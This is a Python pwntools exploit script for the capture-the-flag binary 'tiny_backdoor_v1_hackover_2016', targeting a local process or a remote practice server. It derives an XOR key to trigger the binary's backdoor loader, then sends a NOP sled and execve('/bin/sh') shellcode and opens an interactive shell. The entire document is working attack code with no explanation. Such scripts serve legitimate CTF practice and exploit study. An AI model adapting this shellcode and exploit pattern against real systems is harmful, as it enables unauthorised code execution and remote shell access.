import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./tiny_backdoor_v1_hackover_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./tiny_backdoor_v1_hackover_2016')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28721)
			elf=ELF('./tiny_backdoor_v1_hackover_2016')
			libc=ELF('../../x64libc/libc.so.6')

		
		data = [
			0xb3,	0x91,	0x7f,	0xdd,	0x62,	0x81,	0x11,	0x6a,
			0x90,	0x8c,	0xdb,	0xae,	0x70,	0xa7,	0x3f,	0xff,
			0x3a,	0xc3,	0xe6,	0x32,	0xff,	0x5e,	0x46,	0x63,
			0x9a,	0x14,	0xb7,	0x9e,	0xad,	0xf6,	0x09,	0xdc,
			0x33,	0x2f,	0x35,	0xc6,	0x6f,	0x1a,	0x7f,	0xff,
			0x1b,	0xc2,	0xb5,	0xb7,	0xb7,	0xc2,	0xd1,	0x75,
		]
		shellcode = [0x5d, 0x58, 0x5f, 0xb2, 0xff, 0x0f, 0x05, 0xff, 0xe6]
		key = []
		key1=''
		for i in range(9):
			key.append(shellcode[i] ^ data[i])
			key1+=chr(key[i])

		io.send(key1)
		sleep(1)
		shellcode = [0x90] * 20 + [
			0xb8, 0x3b, 0x00, 0x00, 0x00,
			0xbf, 0x80, 0x01, 0x60, 0x00,
			0x48, 0x31, 0xf6,
			0x48, 0x31, 0xd2,
			0x0f, 0x05
			]

		shell=''
		for i in range(len(shellcode)):
			shell+=chr(shellcode[i])


		shell += b'A' * (74 - len(shell))
		
		# will be at the address 0x600180
		shell += b'/bin/sh\x00'
		io.send(shell)


		#success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue